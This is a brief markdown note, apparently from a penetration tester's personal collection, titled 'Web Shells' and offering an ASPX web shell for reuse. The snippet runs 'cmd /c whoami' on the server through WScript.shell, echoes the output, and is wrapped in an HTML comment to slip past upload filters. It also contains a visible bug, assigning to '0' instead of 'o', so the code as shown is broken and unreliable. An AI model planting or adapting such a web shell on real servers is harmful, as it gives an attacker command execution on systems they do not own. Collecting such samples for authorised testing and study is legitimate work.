# Web Shells

Below are just a curated list of shells that I have used here and there and can be customised to do something:

## ASPX Shell

```html
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.shell")
Set cmd = rs.Exec("cmd /c whoami")
0 = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```
